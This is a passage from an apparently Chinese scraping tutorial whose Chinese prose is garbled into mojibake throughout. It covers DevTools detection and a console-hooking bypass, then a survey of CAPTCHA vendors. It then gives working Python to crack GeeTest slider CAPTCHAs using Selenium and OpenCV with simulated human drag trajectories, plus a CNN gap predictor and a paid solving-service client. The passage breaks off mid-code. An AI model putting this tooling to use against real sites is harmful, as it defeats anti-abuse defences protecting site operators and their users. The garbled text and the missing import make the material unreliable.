      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">detectDevTools</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">widthThreshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">160</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">heightThreshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">outerHeight</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerHeight</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">160</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">widthThreshold</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">heightThreshold</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;DevTools detected!&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">setInterval</span><span class="p">(</span><span class="nx">detectDevTools</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>æ£€æµ‹æ–¹æ³• 2: console.log æ—¶é—´æ£€æµ‹</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">devtools</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nx">open</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">};</span>

<span class="kd">var</span><span class="w"> </span><span class="nx">checkStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">element</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
<span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">element</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">devtools</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;%c&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">element</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">clear</span><span class="p">();</span>
<span class="p">};</span>

<span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">devtools</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="nx">checkStatus</span><span class="p">();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">devtools</span><span class="p">.</span><span class="nx">open</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;DevTools detected!&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// æ‰§è¡Œååˆ¶æªæ–½</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>: ä½¿ç”¨æ— å¤´æµè§ˆå™¨æˆ–ç¦ç”¨ console è¾“å‡º</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook console.log</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{};</span>
</code></pre>
      </div>

      <hr />

      <h3 id="8-éªŒè¯ç æŠ€æœ¯">8. éªŒè¯ç æŠ€æœ¯</h3>

      <h4 id="81-éªŒè¯ç ç±»å‹">8.1 éªŒè¯ç ç±»å‹</h4>

      <p>ç°ä»£éªŒè¯ç ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»:</p>

      <ol>
        <li><strong>å›¾å½¢éªŒè¯ç </strong>: æœ€ä¼ ç»Ÿçš„éªŒè¯ç ï¼ŒåŒ…å«æ‰­æ›²æ–‡å­—ã€å™ªç‚¹ç­‰</li>
        <li><strong>æ»‘å—éªŒè¯ç </strong>: æ‹–åŠ¨æ»‘å—æ‹¼åˆå›¾ç‰‡ï¼ˆå¦‚æéªŒã€ç½‘æ˜“æ˜“ç›¾ï¼‰</li>
        <li><strong>ç‚¹é€‰éªŒè¯ç </strong>: æŒ‰é¡ºåºç‚¹å‡»ç‰¹å®šæ–‡å­—æˆ–ç‰©ä½“</li>
        <li><strong>è¡Œä¸ºéªŒè¯ç </strong>: åˆ†æç”¨æˆ·è¡Œä¸ºè½¨è¿¹ï¼ˆé¼ æ ‡ç§»åŠ¨ã€ç‚¹å‡»æ¨¡å¼ï¼‰</li>
        <li><strong>æ™ºèƒ½éªŒè¯ç </strong>: æ— æ„ŸéªŒè¯ï¼Œé€šè¿‡è®¾å¤‡æŒ‡çº¹å’Œè¡Œä¸ºåˆ†æåˆ¤æ–­</li>
      </ol>

      <h4 id="82-ä¸»æµéªŒè¯ç æœåŠ¡å•†">8.2 ä¸»æµéªŒè¯ç æœåŠ¡å•†</h4>

      <table>
        <thead>
          <tr>
            <th>æœåŠ¡å•†</th>
            <th>ç±»å‹</th>
            <th>ç‰¹ç‚¹</th>
            <th>ç ´è§£éš¾åº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æéªŒ (GeeTest)</strong></td>
            <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
            <td>è¡Œä¸ºè½¨è¿¹åˆ†æã€å¤šç»´åº¦é£æ§</td>
            <td>â˜…â˜…â˜…â˜…â˜…</td>
          </tr>
          <tr>
            <td><strong>ç½‘æ˜“æ˜“ç›¾</strong></td>
            <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
            <td>å›¾åƒä¹±åºã€èƒŒæ™¯èåˆ</td>
            <td>â˜…â˜…â˜…â˜…â˜…</td>
          </tr>
          <tr>
            <td><strong>é˜¿é‡Œäº‘ç›¾</strong></td>
            <td>æ»‘å—ã€æ™ºèƒ½</td>
            <td>é£æ§å¼•æ“ã€è®¾å¤‡æŒ‡çº¹</td>
            <td>â˜…â˜…â˜…â˜…â˜…</td>
          </tr>
          <tr>
            <td><strong>è…¾è®¯å¤©å¾¡</strong></td>
            <td>æ»‘å—ã€ç‚¹é€‰ã€æ™ºèƒ½</td>
            <td>äº¤äº’åŠ¨æ€åŠ è½½</td>
            <td>â˜…â˜…â˜…â˜…â˜…</td>
          </tr>
          <tr>
            <td><strong>ç‚¹è§¦éªŒè¯ç </strong></td>
            <td>æ»‘å—ã€ç‚¹é€‰</td>
            <td>å¤šç§éªŒè¯æ–¹å¼</td>
            <td>â˜…â˜…â˜…â˜…â˜†</td>
          </tr>
          <tr>
            <td><strong>Google reCAPTCHA v3</strong></td>
            <td>æ™ºèƒ½</td>
            <td>æ— æ„ŸéªŒè¯ã€é£é™©è¯„åˆ†</td>
            <td>â˜…â˜…â˜…â˜…â˜†</td>
          </tr>
        </tbody>
      </table>

      <h4 id="83-æ»‘å—éªŒè¯ç åŸç†ä¸ç ´è§£">8.3 æ»‘å—éªŒè¯ç åŸç†ä¸ç ´è§£</h4>

      <p><strong>æéªŒæ»‘å—éªŒè¯ç å·¥ä½œæµç¨‹</strong>:</p>

      <pre><code>1. ç”¨æˆ·è®¿é—®é¡µé¢
2. åŠ è½½éªŒè¯ç ç»„ä»¶
3. æ˜¾ç¤ºç¼ºå£å›¾ç‰‡å’Œæ»‘å—
4. ç”¨æˆ·æ‹–åŠ¨æ»‘å—
5. è®°å½•è½¨è¿¹æ•°æ®ï¼š
   - é¼ æ ‡ç§»åŠ¨è½¨è¿¹
   - é€Ÿåº¦å˜åŒ–
   - åŠ é€Ÿåº¦
   - æ—¶é—´æˆ³
6. æäº¤è½¨è¿¹åˆ°æœåŠ¡å™¨éªŒè¯
7. æœåŠ¡å™¨åˆ†æè¡Œä¸ºç‰¹å¾ï¼š
   - è½¨è¿¹æ˜¯å¦å¹³æ»‘
   - é€Ÿåº¦æ˜¯å¦è‡ªç„¶
   - æ˜¯å¦ç¬¦åˆäººç±»è¡Œä¸º
8. è¿”å›éªŒè¯ç»“æœ
</code></pre>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <p><strong>æ–¹æ³• 1: å›¾åƒè¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿ</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium</span><span class="w"> </span><span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.action_chains</span><span class="w"> </span><span class="kn">import</span> <span class="n">ActionChains</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.by</span><span class="w"> </span><span class="kn">import</span> <span class="n">By</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">PIL</span><span class="w"> </span><span class="kn">import</span> <span class="n">Image</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">cv2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">SliderCracker</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">driver</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span> <span class="o">=</span> <span class="n">driver</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_gap_distance</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bg_img</span><span class="p">,</span> <span class="n">slide_img</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¡ç®—ç¼ºå£è·ç¦»&quot;&quot;&quot;</span>
        <span class="c1"># 1. è½¬æ¢ä¸ºç°åº¦å›¾</span>
        <span class="n">bg_gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">bg_img</span><span class="p">),</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_RGB2GRAY</span><span class="p">)</span>
        <span class="n">slide_gray</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">cvtColor</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">(</span><span class="n">slide_img</span><span class="p">),</span> <span class="n">cv2</span><span class="o">.</span><span class="n">COLOR_RGB2GRAY</span><span class="p">)</span>

        <span class="c1"># 2. è¾¹ç¼˜æ£€æµ‹</span>
        <span class="n">bg_edges</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">Canny</span><span class="p">(</span><span class="n">bg_gray</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>

        <span class="c1"># 3. æ¨¡æ¿åŒ¹é…</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">matchTemplate</span><span class="p">(</span><span class="n">bg_edges</span><span class="p">,</span> <span class="n">slide_gray</span><span class="p">,</span> <span class="n">cv2</span><span class="o">.</span><span class="n">TM_CCOEFF_NORMED</span><span class="p">)</span>
        <span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">,</span> <span class="n">min_loc</span><span class="p">,</span> <span class="n">max_loc</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">minMaxLoc</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

        <span class="c1"># 4. è¿”å›åŒ¹é…ä½ç½®ï¼ˆç¼ºå£è·ç¦»ï¼‰</span>
        <span class="k">return</span> <span class="n">max_loc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_track</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">distance</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆæ‹–åŠ¨è½¨è¿¹ï¼ˆæ¨¡æ‹Ÿäººç±»è¡Œä¸ºï¼‰&quot;&quot;&quot;</span>
        <span class="n">track</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">current</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">mid</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">/</span> <span class="mi">5</span>  <span class="c1"># å‡é€Ÿç‚¹</span>
        <span class="n">t</span> <span class="o">=</span> <span class="mf">0.2</span>  <span class="c1"># æ—¶é—´é—´éš”</span>
        <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># åˆé€Ÿåº¦</span>

        <span class="k">while</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">distance</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">current</span> <span class="o">&lt;</span> <span class="n">mid</span><span class="p">:</span>
                <span class="n">a</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># åŠ é€Ÿåº¦</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">a</span> <span class="o">=</span> <span class="o">-</span><span class="mi">3</span>  <span class="c1"># å‡é€Ÿ</span>

            <span class="n">v0</span> <span class="o">=</span> <span class="n">v</span>
            <span class="n">v</span> <span class="o">=</span> <span class="n">v0</span> <span class="o">+</span> <span class="n">a</span> <span class="o">*</span> <span class="n">t</span>
            <span class="n">move</span> <span class="o">=</span> <span class="n">v0</span> <span class="o">*</span> <span class="n">t</span> <span class="o">+</span> <span class="mi">1</span><span class="o">/</span><span class="mi">2</span> <span class="o">*</span> <span class="n">a</span> <span class="o">*</span> <span class="n">t</span> <span class="o">*</span> <span class="n">t</span>
            <span class="n">current</span> <span class="o">+=</span> <span class="n">move</span>

            <span class="n">track</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">move</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">track</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">move_slider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">slider</span><span class="p">,</span> <span class="n">track</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç§»åŠ¨æ»‘å—&quot;&quot;&quot;</span>
        <span class="n">ActionChains</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">click_and_hold</span><span class="p">(</span><span class="n">slider</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">track</span><span class="p">:</span>
            <span class="n">ActionChains</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span><span class="n">xoffset</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">yoffset</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.001</span><span class="p">,</span> <span class="mf">0.002</span><span class="p">))</span>

        <span class="c1"># éšæœºæŠ–åŠ¨ï¼ˆæ¨¡æ‹Ÿäººç±»ä¿®æ­£ï¼‰</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
            <span class="n">ActionChains</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span>
                <span class="n">xoffset</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span>
                <span class="n">yoffset</span><span class="o">=</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
            <span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.01</span><span class="p">,</span> <span class="mf">0.02</span><span class="p">))</span>

        <span class="n">ActionChains</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">release</span><span class="p">()</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">crack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç ´è§£æ»‘å—éªŒè¯ç &quot;&quot;&quot;</span>
        <span class="c1"># 1. ç­‰å¾…éªŒè¯ç åŠ è½½</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

        <span class="c1"># 2. è·å–èƒŒæ™¯å›¾å’Œæ»‘å—å›¾</span>
        <span class="n">bg_element</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;geetest_canvas_bg&#39;</span><span class="p">)</span>
        <span class="n">slide_element</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;geetest_canvas_slice&#39;</span><span class="p">)</span>

        <span class="c1"># 3. æˆªå›¾</span>
        <span class="n">bg_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">bg_element</span><span class="o">.</span><span class="n">screenshot_as_png</span><span class="p">))</span>
        <span class="n">slide_img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">slide_element</span><span class="o">.</span><span class="n">screenshot_as_png</span><span class="p">))</span>

        <span class="c1"># 4. è®¡ç®—ç¼ºå£è·ç¦»</span>
        <span class="n">distance</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_gap_distance</span><span class="p">(</span><span class="n">bg_img</span><span class="p">,</span> <span class="n">slide_img</span><span class="p">)</span>

        <span class="c1"># 5. ç”Ÿæˆè½¨è¿¹</span>
        <span class="n">track</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_track</span><span class="p">(</span><span class="n">distance</span> <span class="o">-</span> <span class="mi">7</span><span class="p">)</span>  <span class="c1"># å‡å»æ»‘å—å®½åº¦</span>

        <span class="c1"># 6. æ‹–åŠ¨æ»‘å—</span>
        <span class="n">slider</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;geetest_slider_button&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">move_slider</span><span class="p">(</span><span class="n">slider</span><span class="p">,</span> <span class="n">track</span><span class="p">)</span>

        <span class="c1"># 7. ç­‰å¾…éªŒè¯ç»“æœ</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: æ·±åº¦å­¦ä¹ è¯†åˆ«</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">tensorflow</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">tf</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">tensorflow.keras</span><span class="w"> </span><span class="kn">import</span> <span class="n">layers</span><span class="p">,</span> <span class="n">models</span>

<span class="k">class</span><span class="w"> </span><span class="nc">CaptchaCNN</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">model</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">build_model</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">build_model</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ„å»º CNN æ¨¡å‹&quot;&quot;&quot;</span>
        <span class="n">model</span> <span class="o">=</span> <span class="n">models</span><span class="o">.</span><span class="n">Sequential</span><span class="p">([</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="n">activation</span><span class="o">=</span><span class="s1">&#39;relu&#39;</span><span class="p">,</span> <span class="n">input_shape</span><span class="o">=</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span> <span class="mi">260</span><span class="p">,</span> <span class="mi">3</span><span class="p">)),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">MaxPooling2D</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="n">activation</span><span class="o">=</span><span class="s1">&#39;relu&#39;</span><span class="p">),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">MaxPooling2D</span><span class="p">((</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">)),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Conv2D</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="n">activation</span><span class="o">=</span><span class="s1">&#39;relu&#39;</span><span class="p">),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Flatten</span><span class="p">(),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Dense</span><span class="p">(</span><span class="mi">64</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s1">&#39;relu&#39;</span><span class="p">),</span>
            <span class="n">layers</span><span class="o">.</span><span class="n">Dense</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">activation</span><span class="o">=</span><span class="s1">&#39;linear&#39;</span><span class="p">)</span>  <span class="c1"># è¾“å‡ºç¼ºå£ä½ç½®</span>
        <span class="p">])</span>

        <span class="n">model</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
            <span class="n">optimizer</span><span class="o">=</span><span class="s1">&#39;adam&#39;</span><span class="p">,</span>
            <span class="n">loss</span><span class="o">=</span><span class="s1">&#39;mse&#39;</span><span class="p">,</span>
            <span class="n">metrics</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;mae&#39;</span><span class="p">]</span>
        <span class="p">)</span>

        <span class="k">return</span> <span class="n">model</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">train</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X_train</span><span class="p">,</span> <span class="n">y_train</span><span class="p">,</span> <span class="n">epochs</span><span class="o">=</span><span class="mi">50</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®­ç»ƒæ¨¡å‹&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span>
            <span class="n">X_train</span><span class="p">,</span> <span class="n">y_train</span><span class="p">,</span>
            <span class="n">epochs</span><span class="o">=</span><span class="n">epochs</span><span class="p">,</span>
            <span class="n">validation_split</span><span class="o">=</span><span class="mf">0.2</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">predict_gap</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">image</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é¢„æµ‹ç¼ºå£ä½ç½®&quot;&quot;&quot;</span>
        <span class="n">image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">expand_dims</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">axis</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">image</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 3: æ‰“ç å¹³å°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">class</span><span class="w"> </span><span class="nc">OCRService</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">api_key</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">api_key</span> <span class="o">=</span> <span class="n">api_key</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">api_url</span> <span class="o">=</span> <span class="s1">&#39;http://api.ttshitu.com/predict&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">recognize_slider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bg_img_path</span><span class="p">,</span> <span class="n">slide_img_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨æ‰“ç å¹³å°è¯†åˆ«æ»‘å—éªŒè¯ç &quot;&quot;&quot;</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">bg_img_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">bg_img</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">slide_img_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">slide_img</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;your_username&#39;</span><span class="p">,</span>
            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;your_password&#39;</span><span class="p">,</span>
